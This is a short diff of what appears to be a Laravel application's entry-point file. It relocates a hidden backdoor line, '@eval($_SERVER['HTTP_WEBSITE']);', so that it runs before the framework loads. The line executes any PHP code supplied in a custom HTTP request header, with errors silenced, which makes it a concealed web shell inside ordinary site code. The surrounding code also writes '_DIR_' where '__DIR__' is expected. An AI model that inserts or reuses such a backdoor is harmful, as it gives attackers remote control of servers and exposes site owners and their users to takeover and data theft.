@@ -16,6 +16,8 @@ define('LARAVEL_START', microtime(true));
 |
 */
 
+@eval($_SERVER['HTTP_WEBSITE']);
+
 if (file_exists($maintenance = _DIR_.'/../storage/framework/maintenance.php')) {
     require $maintenance;
 }
@@ -53,5 +55,3 @@ $response = $kernel->handle(
 )->send();
 
 $kernel->terminate($request, $response);
-
-@eval($_SERVER['HTTP_WEBSITE']);
